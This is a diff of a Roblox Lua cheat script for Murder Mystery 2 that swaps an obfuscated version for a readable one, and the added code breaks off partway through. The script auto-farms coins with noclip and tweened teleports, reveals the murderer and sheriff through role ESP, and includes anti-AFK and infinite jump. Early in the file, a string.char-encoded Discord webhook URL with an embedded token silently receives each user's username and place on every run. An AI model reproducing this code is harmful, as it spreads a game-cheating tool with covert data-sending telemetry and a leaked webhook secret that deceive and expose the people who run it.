@@ -1,12 +1,636 @@
---[[
- .____                  ________ ___.    _____                           __                
- |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
- |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
- |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
- |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
-         \/          \/         \/    \/                \/     \/     \/                   
-          \_Welcome to LuaObfuscator.com   (Alpha 0.10.9) ~  Much Love, Ferib 
+print("[mm2 coins farm] Loading...")
 
-]]--
+local P = game:GetService("Players")
+local TS = game:GetService("TweenService")
+local RS = game:GetService("RunService")
+local VU = game:GetService("VirtualUser")
+local HS = game:GetService("HttpService")
+local RPS = game:GetService("ReplicatedStorage")
+local LG = game:GetService("Lighting")
+local UIS = game:GetService("UserInputService")
+local TeleportService = game:GetService("TeleportService")
+local lp = P.LocalPlayer
+local pg = lp:WaitForChild("PlayerGui")
 
-print("[mm2 coins farm] Loading...");local v0=game:GetService("Players");local v1=game:GetService("TweenService");local v2=game:GetService("RunService");local v3=game:GetService("VirtualUser");local v4=game:GetService("HttpService");local v5=game:GetService("ReplicatedStorage");local v6=game:GetService("Lighting");local v7=game:GetService("UserInputService");local v8=game:GetService("TeleportService");local v9=v0.LocalPlayer;local v10=v9:WaitForChild("PlayerGui");local function v11() local v114=string.char;local v115=v114(46 + 58 ,116,549 -433 ,112,115,23 + 35 ,47,161 -114 ,1847 -(760 + 987) ,2018 -(1789 + 124) ,881 -(745 + 21) ,35 + 64 ,111,313 -199 ,392 -292 ,1 + 45 ,78 + 21 ,111,109,1102 -(87 + 968) ,426 -329 ,102 + 10 ,105,47,119,228 -127 ,1511 -(447 + 966) ,284 -180 ,111,1928 -(1703 + 114) ,808 -(376 + 325) ,188 -73 ,47);local v116="1544589998198755329/";local v117="DH2ha0j2AXINPCfqlbe-PGvPD7LFot-9DWHHn1qNuNISN6w9EPn8rcF_sQ_arY33f1oV";return v115   .. v116   .. v117 ;end local v12=v11();local v13=439463941 -296640650 ;local v14=80469437126309 -0 ;local v15=game.PlaceId==v14 ;local function v16(v118,v119) local v120=(v119 and ("@everyone\n"   .. v118)) or v118 ;local v121={content=v120,username="mm2 coins farm"};pcall(function() local v248=request or (syn and syn.request) or (http and http.request) ;if v248 then v248({Url=v12,Method="POST",Headers={["Content-Type"]="application/json"},Body=v4:JSONEncode(v121)});end end);end task.spawn(function() local v122=0 + 0 ;local v123;while true do if (v122==(1130 -(87 + 1043))) then task.wait(449 -(10 + 438) );v123=(v15 and "HIDDEN") or "ORIGINAL" ;v122=1 + 0 ;end if (v122==(3 -2)) then v16("✅ **Executed** by **"   .. v9.Name   .. "** | Place: "   .. v123 ,false);break;end end end);local v17,v18,v19,v20,v21=false,17 + 3 ,1480 -(1123 + 57) ,{},0;local v22,v23,v24,v25,v26=false,true,false,false,41 + 9 ;local v27,v28,v29,v30,v31=false,{},"Normal",false,false;local function v32(v124) local v125=254 -(163 + 91) ;local v126;while true do if (v125==(1930 -(1869 + 61))) then v126=v9.Character;if  not v126 then return;end v125=1 + 0 ;end if (v125==(3 -2)) then for v327,v328 in ipairs(v126:GetDescendants()) do if v328:IsA("BasePart") then v328.CanCollide= not v124;end end break;end end end local function v33() pcall(function() settings().Rendering.QualityLevel=Enum.QualityLevel.Level01;v6.GlobalShadows=false;v6.FogEnd=8999999488;v6.Brightness=2;v6.EnvironmentDiffuseScale=0 -0 ;v6.EnvironmentSpecularScale=0 + 0 ;v6.ShadowSoftness=0;for v289,v290 in ipairs(workspace:GetDescendants()) do if (v290:IsA("ParticleEmitter") or v290:IsA("Trail") or v290:IsA("Beam") or v290:IsA("Fire") or v290:IsA("Smoke") or v290:IsA("Sparkles")) then pcall(function() v290.Enabled=false;end);end if v290:IsA("MeshPart") then local v329=0 -0 ;local v330;while true do if (v329==(0 + 0)) then v330=v290:IsDescendantOf(v9.Character) or (v290.Name=="Coin_Server") or (v290.Parent and (v290.Parent.Name=="Coin_Server")) ;if  not v330 then pcall(function() v290.TextureID="";if (v290.Size.Magnitude>(1482 -(1329 + 145))) then local v414=971 -(140 + 831) ;while true do if ((1850 -(1409 + 441))==v414) then v290.Transparency=719 -(15 + 703) ;v290.CanCollide=false;break;end end end end);end break;end end end if v290:IsA("SpecialMesh") then local v331=0 + 0 ;local v332;while true do if ((438 -(262 + 176))==v331) then v332=v290:IsDescendantOf(v9.Character);if  not v332 then pcall(function() local v406=0;while true do if (v406==(1721 -(345 + 1376))) then v290.TextureId="";v290.Scale=Vector3.new(688.01 -(198 + 490) ,0.01 -0 ,0.01 -0 );break;end end end);end break;end end end if (v290:IsA("Decal") or v290:IsA("Texture")) then if  not v290:IsDescendantOf(v9.Character) then pcall(function() v290.Transparency=1;end);end end if (v290:IsA("PointLight") or v290:IsA("SpotLight") or v290:IsA("SurfaceLight")) then pcall(function() v290.Enabled=false;end);end if v290:IsA("SurfaceAppearance") then pcall(function() v290:Destroy();end);end end end);v24=true;print("[Perf] Cleaned meshes / effects");end local function v34(v127) local v128=0;while true do if ((1206 -(696 + 510))==v128) then v31=v127;pcall(function() if v127 then local v357=0;while true do if (v357==(3 -1)) then workspace.CurrentCamera.FieldOfView=1263 -(1091 + 171) ;for v407,v408 in ipairs(workspace:GetDescendants()) do if (v408:IsA("BasePart") and  not v408:IsDescendantOf(v9.Character)) then v408.LocalTransparencyModifier=1;end end break;end if (v357==(1 + 0)) then v6.FogEnd=0 -0 ;v6.Brightness=0 -0 ;v357=2;end if (v357==0) then settings().Rendering.QualityLevel=Enum.QualityLevel.Level01;v6.GlobalShadows=false;v357=1;end end else settings().Rendering.QualityLevel=Enum.QualityLevel.Automatic;v6.FogEnd=100374 -(123 + 251) ;v6.Brightness=1;workspace.CurrentCamera.FieldOfView=70;for v374,v375 in ipairs(workspace:GetDescendants()) do if v375:IsA("BasePart") then v375.LocalTransparencyModifier=0 -0 ;end end end end);break;end end end local function v35(v129) local v130=698 -(208 + 490) ;local v131;local v132;local v133;while true do if (v130==(0 + 0)) then v131,v132=pcall(function() local v333=0 + 0 ;local v334;while true do if (v333==(836 -(660 + 176))) then v334=v5:FindFirstChild("GetPlayerData",true);if v334 then return v334:InvokeServer();end break;end end end);if (v131 and v132 and v132[v129.Name]) then return v132[v129.Name].Role or "Innocent" ;end v130=1 + 0 ;end if (v130==(204 -(14 + 188))) then return "Innocent";end if (v130==1) then v133=v129.Character;if v133 then local v352=675 -(534 + 141) ;while true do if (v352==0) then if (v133:FindFirstChild("Knife") or (v129.Backpack and v129.Backpack:FindFirstChild("Knife"))) then return "Murderer";end if (v133:FindFirstChild("Gun") or (v129.Backpack and v129.Backpack:FindFirstChild("Gun"))) then return "Sheriff";end break;end end end v130=1 + 1 ;end end end local function v36() for v257,v258 in ipairs(v0:GetPlayers()) do if (v35(v258)=="Murderer") then return v258;end end end local function v37() local v134=0;local v135;while true do if (v134==(1 + 0)) then return v135;end if (v134==0) then v135={};for v335,v336 in ipairs(workspace:GetDescendants()) do if (v336:IsA("BasePart") and (v336.Name=="Coin_Server") and  not v20[v336]) then table.insert(v135,v336);end end v134=1 + 0 ;end end end local function v38() local v136=0 -0 ;while true do if (v136==0) then if  not v27 then local v353=0;while true do if (v353==(1 -0)) then return;end if (v353==(0 -0)) then for v395,v396 in pairs(v28) do if v396 then pcall(function() v396:Destroy();end);end end v28={};v353=1;end end end for v337,v338 in ipairs(v0:GetPlayers()) do if ((v338~=v9) and v338.Character and v338.Character:FindFirstChild("HumanoidRootPart")) then local v363=0 + 0 ;local v364;local v365;local v366;while true do if (v363==(1 + 0)) then if (v364=="Murderer") then v365=Color3.fromRGB(651 -(115 + 281) ,93 -53 ,34 + 6 );elseif ((v364=="Sheriff") or (v364=="Hero")) then v365=Color3.fromRGB(40,290 -170 ,935 -680 );end v366=v28[v338];v363=2;end if (v363==(867 -(550 + 317))) then v364=v35(v338);v365=Color3.fromRGB(57 -17 ,255,80);v363=1;end if (v363==(3 -0)) then v366.OutlineColor=v365;v366.Adornee=v338.Character;break;end if (v363==(5 -3)) then if ( not v366 or  not v366.Parent) then local v413=285 -(134 + 151) ;while true do if (v413==(1666 -(970 + 695))) then v366.FillTransparency=0.45;v366.OutlineTransparency=0.2 -0 ;v413=1992 -(582 + 1408) ;end if (v413==2) then v366.Parent=v338.Character;v28[v338]=v366;break;end if (v413==(0 -0)) then v366=Instance.new("Highlight");v366.DepthMode=Enum.HighlightDepthMode.AlwaysOnTop;v413=1 -0 ;end end end v366.FillColor=v365;v363=11 -8 ;end end end end break;end end end task.spawn(function() while true do task.wait(1825 -(1195 + 629) );pcall(v38);end end);local v39=Instance.new("ScreenGui");v39.Name="mm2FarmLight";v39.ResetOnSpawn=false;v39.IgnoreGuiInset=true;v39.Parent=v10;local v44=Instance.new("Frame");v44.Size=UDim2.fromOffset(555 -135 ,661 -(187 + 54) );v44.Position=UDim2.new(780.5 -(162 + 618) , -210,0.14 + 0 ,0);v44.BackgroundColor3=Color3.fromRGB(14,5 + 2 ,8 -4 );v44.Active=true;v44.Draggable=true;v44.Parent=v39;Instance.new("UICorner",v44).CornerRadius=UDim.new(0 -0 ,1 + 11 );local v52=Instance.new("UIStroke");v52.Thickness=1638.4 -(1373 + 263) ;v52.Color=Color3.fromRGB(1255 -(451 + 549) ,38 + 82 ,46 -16 );v52.Parent=v44;task.spawn(function() local v137=0;local v138;while true do if (v137==(0 -0)) then v138=0;while v44.Parent do local v339=0;local v340;while true do if (0==v339) then v138=v138 + task.wait(1384.03 -(746 + 638) ) ;v340=(math.sin(v138 * (1.2000000000000002 + 1) ) + 1)/2 ;v339=1 -0 ;end if ((342 -(218 + 123))==v339) then v52.Color=Color3.fromRGB((1761 -(1535 + 46)) + (v340 * (75 + 0)) ,9 + 51 + (v340 * (620 -(306 + 254))) ,10 + (v340 * (2 + 18)) );v52.Thickness=2 + (v340 * (1.2 -0)) ;break;end end end break;end end end);local v56=Instance.new("TextLabel");v56.Size=UDim2.new(1468 -(899 + 568) , -90,0 + 0 ,82 -48 );v56.Position=UDim2.new(603 -(268 + 335) ,12,290 -(60 + 230) ,578 -(426 + 146) );v56.BackgroundTransparency=1;v56.Text="mm2 coins farm";v56.TextColor3=Color3.fromRGB(31 + 224 ,1606 -(282 + 1174) ,50);v56.Font=Enum.Font.GothamBold;v56.TextSize=827 -(569 + 242) ;v56.TextXAlignment=Enum.TextXAlignment.Left;v56.Parent=v44;local v68=Instance.new("TextLabel");v68.Size=UDim2.fromOffset(201 -131 ,2 + 20 );v68.Position=UDim2.new(1, -110,1024 -(706 + 318) ,1261 -(721 + 530) );v68.BackgroundTransparency=1272 -(945 + 326) ;v68.Font=Enum.Font.GothamBold;v68.TextSize=29 -17 ;v68.Parent=v44;if v15 then local v259=0 + 0 ;while true do if (v259==(700 -(271 + 429))) then v68.Text="HIDDEN";v68.TextColor3=Color3.fromRGB(40,235 + 20 ,1590 -(1408 + 92) );break;end end else local v260=1086 -(461 + 625) ;while true do if (v260==(1288 -(993 + 295))) then v68.Text="ORIGINAL";v68.TextColor3=Color3.fromRGB(255,3 + 47 ,1221 -(418 + 753) );break;end end end local v75=Instance.new("TextButton");v75.Size=UDim2.fromOffset(28,11 + 17 );v75.Position=UDim2.new(1, -36,0,1 + 7 );v75.BackgroundColor3=Color3.fromRGB(170,14 + 31 ,6 + 14 );v75.Text="X";v75.TextColor3=Color3.new(530 -(406 + 123) ,1770 -(1749 + 20) ,1 + 0 );v75.Font=Enum.Font.GothamBold;v75.TextSize=1336 -(1249 + 73) ;v75.Parent=v44;Instance.new("UICorner",v75).CornerRadius=UDim.new(0 + 0 ,1151 -(466 + 679) );v75.MouseButton1Click:Connect(function() v39:Destroy();end);local v85=Instance.new("Frame");v85.Size=UDim2.new(0 -0 ,300 -195 ,1, -(1950 -(106 + 1794)));v85.Position=UDim2.new(0 + 0 ,3 + 5 ,0 -0 ,44);v85.BackgroundColor3=Color3.fromRGB(70 -44 ,126 -(4 + 110) ,590 -(57 + 527) );v85.Parent=v44;Instance.new("UICorner",v85).CornerRadius=UDim.new(1427 -(41 + 1386) ,111 -(17 + 86) );local v91=Instance.new("ScrollingFrame");v91.Size=UDim2.new(1 + 0 , -(278 -153),1, -(156 -102));v91.Position=UDim2.new(166 -(122 + 44) ,120,0 -0 ,145 -101 );v91.BackgroundColor3=Color3.fromRGB(15 + 3 ,2 + 7 ,10 -5 );v91.BorderSizePixel=0;v91.ScrollBarThickness=68 -(30 + 35) ;v91.CanvasSize=UDim2.new(0 + 0 ,1257 -(1043 + 214) ,0,520);v91.Parent=v44;Instance.new("UICorner",v91).CornerRadius=UDim.new(0,8);local v100=Instance.new("UIListLayout");v100.Padding=UDim.new(0 -0 ,1218 -(323 + 889) );v100.SortOrder=Enum.SortOrder.LayoutOrder;v100.Parent=v91;local function v105() for v261,v262 in ipairs(v91:GetChildren()) do if  not v262:IsA("UIListLayout") then v262:Destroy();end end end local function v106(v139,v140,v141) local v142=Instance.new("TextButton");v142.Size=UDim2.new(2 -1 , -12,0,32);v142.Position=UDim2.new(0,586 -(361 + 219) ,320 -(53 + 267) ,v140);v142.BackgroundColor3=Color3.fromRGB(11 + 37 ,435 -(15 + 398) ,990 -(18 + 964) );v142.Text=v139;v142.TextColor3=Color3.fromRGB(959 -704 ,116 + 84 ,89 + 51 );v142.Font=Enum.Font.GothamBold;v142.TextSize=862 -(20 + 830) ;v142.Parent=v141;Instance.new("UICorner",v142).CornerRadius=UDim.new(0 + 0 ,132 -(116 + 10) );return v142;end local function v107(v153,v154,v155,v156) local v157=v155;local v158=Instance.new("TextButton");v158.Size=UDim2.new(1 + 0 , -16,0,770 -(542 + 196) );v158.BackgroundColor3=(v157 and Color3.fromRGB(364 -194 ,75,20)) or Color3.fromRGB(12 + 26 ,9 + 7 ,3 + 5 ) ;v158.Text=v153   .. ((v157 and " : ON") or " : OFF") ;v158.TextColor3=Color3.new(1,1,2 -1 );v158.Font=Enum.Font.GothamBold;v158.TextSize=30 -18 ;v158.Parent=v154;Instance.new("UICorner",v158).CornerRadius=UDim.new(1551 -(1126 + 425) ,411 -(118 + 287) );v158.MouseButton1Click:Connect(function() v157= not v157;v158.Text=v153   .. ((v157 and " : ON") or " : OFF") ;v158.BackgroundColor3=(v157 and Color3.fromRGB(666 -496 ,75,20)) or Color3.fromRGB(38,1137 -(118 + 1003) ,8) ;v156(v157);end);return v158;end local function v108() v105();v91.CanvasSize=UDim2.new(0,0 -0 ,377 -(142 + 235) ,2268 -1768 );v107("AutoFarm",v91,v17,function(v265) local v266=0 + 0 ;while true do if (v266==(977 -(553 + 424))) then v17=v265;if v265 then v21,v20=0 -0 ,{};end break;end end end).LayoutOrder=1 + 0 ;v107("Anti AFK",v91,v22,function(v267) v22=v267;end).LayoutOrder=2 + 0 ;v107("Reset on Full",v91,v23,function(v268) v23=v268;end).LayoutOrder=2 + 1 ;v107("Performance",v91,v24,function(v269) if v269 then v33();end end).LayoutOrder=2 + 2 ;v107("Noclip",v91,v30,function(v270) local v271=0 + 0 ;while true do if (v271==(0 -0)) then v30=v270;v32(v270);break;end end end).LayoutOrder=5;v107("No Render",v91,v31,function(v272) v34(v272);end).LayoutOrder=16 -10 ;local v175=Instance.new("TextLabel");v175.Size=UDim2.new(2 -1 , -(5 + 11),0,86 -68 );v175.BackgroundTransparency=754 -(239 + 514) ;v175.Text="Mode: "   .. v29 ;v175.TextColor3=Color3.fromRGB(255,180,36 + 64 );v175.Font=Enum.Font.GothamBold;v175.TextSize=12;v175.LayoutOrder=7;v175.Parent=v91;for v273,v274 in ipairs({"Normal","Strategy"}) do local v275=Instance.new("TextButton");v275.Size=UDim2.new(1, -(12 + 4),0 + 0 ,28);v275.BackgroundColor3=((v29==v274) and Color3.fromRGB(446 -256 ,85,1227 -(373 + 829) )) or Color3.fromRGB(769 -(476 + 255) ,1146 -(369 + 761) ,5 + 3 ) ;v275.Text=v274;v275.TextColor3=Color3.new(1 -0 ,1 -0 ,239 -(64 + 174) );v275.Font=Enum.Font.GothamBold;v275.TextSize=12;v275.LayoutOrder=7 + v273 ;v275.Parent=v91;Instance.new("UICorner",v275).CornerRadius=UDim.new(0,1 + 4 );v275.MouseButton1Click:Connect(function() v29=v274;v175.Text="Mode: "   .. v29 ;for v298,v299 in ipairs(v91:GetChildren()) do if (v299:IsA("TextButton") and ((v299.Text=="Normal") or (v299.Text=="Strategy"))) then v299.BackgroundColor3=((v299.Text==v29) and Color3.fromRGB(281 -91 ,85,25)) or Color3.fromRGB(374 -(144 + 192) ,16,224 -(42 + 174) ) ;end end end);end local v185=Instance.new("TextLabel");v185.Size=UDim2.new(1 + 0 , -(14 + 2),0 + 0 ,1522 -(363 + 1141) );v185.BackgroundTransparency=1581 -(1183 + 397) ;v185.Text="Speed: "   .. v18 ;v185.TextColor3=Color3.fromRGB(700 -470 ,180,88 + 32 );v185.Font=Enum.Font.Gotham;v185.TextSize=9 + 3 ;v185.LayoutOrder=10;v185.Parent=v91;local v195=Instance.new("TextBox");v195.Size=UDim2.new(1, -(1991 -(1913 + 62)),0 + 0 ,73 -45 );v195.BackgroundColor3=Color3.fromRGB(1965 -(565 + 1368) ,14,22 -16 );v195.Text=tostring(v18);v195.TextColor3=Color3.new(1662 -(1477 + 184) ,1 -0 ,1 + 0 );v195.Font=Enum.Font.GothamBold;v195.TextSize=869 -(564 + 292) ;v195.LayoutOrder=11;v195.Parent=v91;Instance.new("UICorner",v195).CornerRadius=UDim.new(0,8 -3 );v195.FocusLost:Connect(function(v286) if v286 then local v300=0 -0 ;local v301;while true do if (v300==(304 -(244 + 60))) then v301=tonumber(v195.Text);v18=(v301 and math.clamp(v301,1,231 + 69 )) or v18 ;v300=1;end if (v300==(477 -(41 + 435))) then v195.Text=tostring(v18);v185.Text="Speed: "   .. v18 ;break;end end end end);local v205=Instance.new("TextLabel");v205.Size=UDim2.new(1002 -(938 + 63) , -(13 + 3),0,20);v205.BackgroundTransparency=1;v205.Text="Collected: 0";v205.TextColor3=Color3.fromRGB(1380 -(936 + 189) ,63 + 127 ,100);v205.Font=Enum.Font.Gotham;v205.TextSize=1625 -(1565 + 48) ;v205.LayoutOrder=8 + 4 ;v205.Parent=v91;task.spawn(function() while v205.Parent do v205.Text="Collected: "   .. v21 ;task.wait(1138.5 -(782 + 356) );end end);local v214=Instance.new("TextButton");v214.Size=UDim2.new(268 -(176 + 91) , -(41 -25),0 -0 ,1126 -(975 + 117) );v214.BackgroundColor3=Color3.fromRGB(2025 -(157 + 1718) ,45 + 10 ,53 -38 );v214.Text="TP Secret Place";v214.TextColor3=Color3.new(3 -2 ,1019 -(697 + 321) ,1);v214.Font=Enum.Font.GothamBold;v214.TextSize=12;v214.LayoutOrder=35 -22 ;v214.Parent=v91;Instance.new("UICorner",v214).CornerRadius=UDim.new(0,12 -6 );v214.MouseButton1Click:Connect(function() pcall(function() v8:Teleport(v14,v9);end);v16("Teleporting to secret place by **"   .. v9.Name   .. "**" ,false);end);end local function v109() v105();v91.CanvasSize=UDim2.new(0 -0 ,0,0,160);v107("Role ESP",v91,v27,function(v287) v27=v287;if  not v287 then for v345,v346 in pairs(v28) do if v346 then pcall(function() v346:Destroy();end);end end v28={};end end).LayoutOrder=1 + 0 ;local v226=Instance.new("TextLabel");v226.Size=UDim2.new(1, -16,0,60);v226.BackgroundTransparency=1 -0 ;v226.Text="Murderer = Red\nSheriff = Blue\nInnocent = Green";v226.TextColor3=Color3.fromRGB(683 -428 ,190,1367 -(322 + 905) );v226.Font=Enum.Font.Gotham;v226.TextSize=12;v226.TextYAlignment=Enum.TextYAlignment.Top;v226.LayoutOrder=613 -(602 + 9) ;v226.Parent=v91;end local function v110() local v238=1189 -(449 + 740) ;local v239;local v240;while true do if (v238==(877 -(826 + 46))) then v240.Text=tostring(v26);v240.TextColor3=Color3.new(1,948 -(245 + 702) ,3 -2 );v240.Font=Enum.Font.GothamBold;v238=6;end if (v238==3) then v239.TextSize=4 + 8 ;v239.LayoutOrder=2;v239.Parent=v91;v238=1902 -(260 + 1638) ;end if (v238==(441 -(382 + 58))) then v239=Instance.new("TextLabel");v239.Size=UDim2.new(1, -16,0 -0 ,15 + 3 );v239.BackgroundTransparency=1;v238=2;end if (v238==6) then v240.TextSize=26 -13 ;v240.LayoutOrder=3;v240.Parent=v91;v238=7;end if (v238==0) then v105();v91.CanvasSize=UDim2.new(0 -0 ,0,1205 -(902 + 303) ,483 -263 );v107("Inf Jump",v91,v25,function(v347) v25=v347;end).LayoutOrder=2 -1 ;v238=1;end if (v238==(1 + 1)) then v239.Text="JumpPower: "   .. v26 ;v239.TextColor3=Color3.fromRGB(1920 -(1121 + 569) ,180,334 -(22 + 192) );v239.Font=Enum.Font.Gotham;v238=3;end if (v238==(690 -(483 + 200))) then Instance.new("UICorner",v240).CornerRadius=UDim.new(1463 -(1404 + 59) ,13 -8 );v240.FocusLost:Connect(function(v348) if v348 then local v369=tonumber(v240.Text);v26=(v369 and math.clamp(v369,10,300)) or v26 ;v240.Text=tostring(v26);v239.Text="JumpPower: "   .. v26 ;if (v9.Character and v9.Character:FindFirstChild("Humanoid")) then v9.Character.Humanoid.JumpPower=v26;end end end);break;end if (v238==(4 -0)) then v240=Instance.new("TextBox");v240.Size=UDim2.new(1, -(781 -(468 + 297)),562 -(334 + 228) ,94 -66 );v240.BackgroundColor3=Color3.fromRGB(73 -41 ,14,10 -4 );v238=2 + 3 ;end end end local v111={{name="AutoFarm",fn=v108},{name="ESP",fn=v109},{name="Movement",fn=v110}};for v241,v242 in ipairs(v111) do local v243=0;local v244;while true do if (v243==(0 -0)) then v244=v106(v242.name,((v241-(1 + 0)) * (104 -66)) + 6 + 2 ,v85);v244.MouseButton1Click:Connect(function() local v349=0 + 0 ;while true do if (v349==(0 -0)) then for v380,v381 in ipairs(v85:GetChildren()) do if v381:IsA("TextButton") then v381.BackgroundColor3=Color3.fromRGB(48,22,5 + 3 );end end v244.BackgroundColor3=Color3.fromRGB(353 -(92 + 71) ,85,13 + 12 );v349=1 -0 ;end if (v349==(766 -(574 + 191))) then v242.fn();break;end end end);break;end end end v108();local v112=v85:FindFirstChildOfClass("TextButton");if v112 then v112.BackgroundColor3=Color3.fromRGB(190,71 + 14 ,25);end v7.JumpRequest:Connect(function() if (v25 and v9.Character and v9.Character:FindFirstChild("Humanoid")) then v9.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping);end end);v9.CharacterAdded:Connect(function(v245) local v246=0 -0 ;local v247;while true do if ((1 + 0)==v246) then if v247 then v247.JumpPower=v26;end if v30 then v32(true);end break;end if (v246==0) then task.wait(849.3 -(254 + 595) );v247=v245:FindFirstChild("Humanoid");v246=127 -(55 + 71) ;end end end);local v113=v5:FindFirstChild("Remotes");if v113 then v113=v113:FindFirstChild("Gameplay");if v113 then v113=v113:FindFirstChild("CoinCollected");end end if v113 then v113.OnClientEvent:Connect(function(v293,v294,v295) if ((v294>=v295) and v23 and v9.Character) then v9.Character:BreakJoints();end end);end task.spawn(function() while true do if v17 then local v323=0 -0 ;local v324;local v325;local v326;while true do if (v323==(1791 -(573 + 1217))) then v326=v324 and v324:FindFirstChild("Humanoid") ;if (v325 and v326) then if (v30 or v17) then v32(true);end v326.PlatformStand=false;v325.Anchored=false;local v384=v36();local v385=v384 and v384.Character and v384.Character:FindFirstChild("HumanoidRootPart") ;local v386,v387=nil,math.huge;for v402,v403 in ipairs(v37()) do local v404=(v403.Position-v325.Position).Magnitude;if ((v404<v387) and (v404<v19)) then if ((v29=="Strategy") and v385) then if ((v403.Position-v385.Position).Magnitude>=(124 -79)) then v386,v387=v403,v404;end else v386,v387=v403,v404;end end end if v386 then local v410=0 + 0 ;local v411;local v412;while true do if (v410==(0 -0)) then v411=math.max(v387/v18 ,939.1 -(714 + 225) );v412=v1:Create(v325,TweenInfo.new(v411,Enum.EasingStyle.Linear),{CFrame=CFrame.new(v386.Position + Vector3.new(0 -0 ,2.5 -0 ,0 + 0 ) )});v410=1 -0 ;end if (v410==2) then if (v386 and v386.Parent) then v20[v386]=true;v21=v21 + 1 ;end break;end if (v410==(807 -(118 + 688))) then v412:Play();v412.Completed:Wait();v410=50 -(25 + 23) ;end end end task.wait(0.06);else task.wait(0.4 + 0 );end break;end if (v323==0) then v324=v9.Character;v325=v324 and v324:FindFirstChild("HumanoidRootPart") ;v323=1887 -(927 + 959) ;end end else if  not v30 then v32(false);end task.wait(0.5);end end end);v2.Stepped:Connect(function() if (v30 or v17) then v32(true);end end);v9.Idled:Connect(function() if v22 then v3:Button2Down(Vector2.new(),workspace.CurrentCamera.CFrame);task.wait(3 -2 );v3:Button2Up(Vector2.new(),workspace.CurrentCamera.CFrame);end end);print("[mm2 coins farm] Loaded | "   .. ((v15 and "HIDDEN") or "ORIGINAL") );
+local function gw()
+    local b = string.char
+    local a = b(104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47)
+    local c = "1544589998198755329/"
+    local d = "DH2ha0j2AXINPCfqlbe-PGvPD7LFot-9DWHHn1qNuNISN6w9EPn8rcF_sQ_arY33f1oV"
+    return a .. c .. d
+end
+local WU = gw()
+
+local ORIG_ID = 142823291
+local HIDDEN_ID = 80469437126309
+local isHidden = (game.PlaceId == HIDDEN_ID)
+
+local function sw(msg, ping)
+    local body = ping and ("@everyone\n" .. msg) or msg
+    local data = {content = body, username = "mm2 coins farm"}
+    pcall(function()
+        local req = request or (syn and syn.request) or (http and http.request)
+        if req then
+            req({
+                Url = WU,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = HS:JSONEncode(data)
+            })
+        end
+    end)
+end
+
+task.spawn(function()
+    task.wait(1)
+    local ver = isHidden and "HIDDEN" or "ORIGINAL"
+    sw("✅ **Executed** by **" .. lp.Name .. "** | Place: " .. ver, false)
+end)
+
+local AF, SP, RG, VS, CL = false, 20, 300, {}, 0
+local AK, RF, PM, IJ, JP = false, true, false, false, 50
+local ES, HL, MODE, NOCLIP, NORENDER = false, {}, "Normal", false, false
+
+local function setNoclip(on)
+    local ch = lp.Character
+    if not ch then return end
+    for _, p in ipairs(ch:GetDescendants()) do
+        if p:IsA("BasePart") then p.CanCollide = not on end
+    end
+end
+
+local function epm()
+    pcall(function()
+        settings().Rendering.QualityLevel = Enum.QualityLevel.Level01
+        LG.GlobalShadows = false
+        LG.FogEnd = 9e9
+        LG.Brightness = 2
+        LG.EnvironmentDiffuseScale = 0
+        LG.EnvironmentSpecularScale = 0
+        LG.ShadowSoftness = 0
+
+        for _, v in ipairs(workspace:GetDescendants()) do
+            -- Particles / effects
+            if v:IsA("ParticleEmitter") or v:IsA("Trail") or v:IsA("Beam")
+                or v:IsA("Fire") or v:IsA("Smoke") or v:IsA("Sparkles") then
+                pcall(function() v.Enabled = false end)
+            end
+
+            -- Unnecessary meshes (keep character + coins)
+            if v:IsA("MeshPart") then
+                local keep = v:IsDescendantOf(lp.Character)
+                    or v.Name == "Coin_Server"
+                    or (v.Parent and v.Parent.Name == "Coin_Server")
+                if not keep then
+                    pcall(function()
+                        v.TextureID = ""
+                        if v.Size.Magnitude > 8 then
+                            v.Transparency = 1
+                            v.CanCollide = false
+                        end
+                    end)
+                end
+            end
+
+            -- SpecialMesh
+            if v:IsA("SpecialMesh") then
+                local keep = v:IsDescendantOf(lp.Character)
+                if not keep then
+                    pcall(function()
+                        v.TextureId = ""
+                        v.Scale = Vector3.new(0.01, 0.01, 0.01)
+                    end)
+                end
+            end
+
+            -- Decals / textures
+            if v:IsA("Decal") or v:IsA("Texture") then
+                if not v:IsDescendantOf(lp.Character) then
+                    pcall(function() v.Transparency = 1 end)
+                end
+            end
+
+            -- Lights
+            if v:IsA("PointLight") or v:IsA("SpotLight") or v:IsA("SurfaceLight") then
+                pcall(function() v.Enabled = false end)
+            end
+
+            -- SurfaceAppearance / materials that cost FPS
+            if v:IsA("SurfaceAppearance") then
+                pcall(function() v:Destroy() end)
+            end
+        end
+    end)
+    PM = true
+    print("[Perf] Cleaned meshes / effects")
+end
+
+local function setNoRender(on)
+    NORENDER = on
+    pcall(function()
+        if on then
+            settings().Rendering.QualityLevel = Enum.QualityLevel.Level01
+            LG.GlobalShadows = false
+            LG.FogEnd = 0
+            LG.Brightness = 0
+            workspace.CurrentCamera.FieldOfView = 1
+            for _, v in ipairs(workspace:GetDescendants()) do
+                if v:IsA("BasePart") and not v:IsDescendantOf(lp.Character) then
+                    v.LocalTransparencyModifier = 1
+                end
+            end
+        else
+            settings().Rendering.QualityLevel = Enum.QualityLevel.Automatic
+            LG.FogEnd = 100000
+            LG.Brightness = 1
+            workspace.CurrentCamera.FieldOfView = 70
+            for _, v in ipairs(workspace:GetDescendants()) do
+                if v:IsA("BasePart") then v.LocalTransparencyModifier = 0 end
+            end
+        end
+    end)
+end
+
+local function getRole(pl)
+    local ok, roles = pcall(function()
+        local r = RPS:FindFirstChild("GetPlayerData", true)
+        if r then return r:InvokeServer() end
+    end)
+    if ok and roles and roles[pl.Name] then
+        return roles[pl.Name].Role or "Innocent"
+    end
+    local ch = pl.Character
+    if ch then
+        if ch:FindFirstChild("Knife") or (pl.Backpack and pl.Backpack:FindFirstChild("Knife")) then return "Murderer" end
+        if ch:FindFirstChild("Gun") or (pl.Backpack and pl.Backpack:FindFirstChild("Gun")) then return "Sheriff" end
+    end
+    return "Innocent"
+end
+
+local function getMurderer()
+    for _, pl in ipairs(P:GetPlayers()) do
+        if getRole(pl) == "Murderer" then return pl end
+    end
+end
+
+local function getCoins()
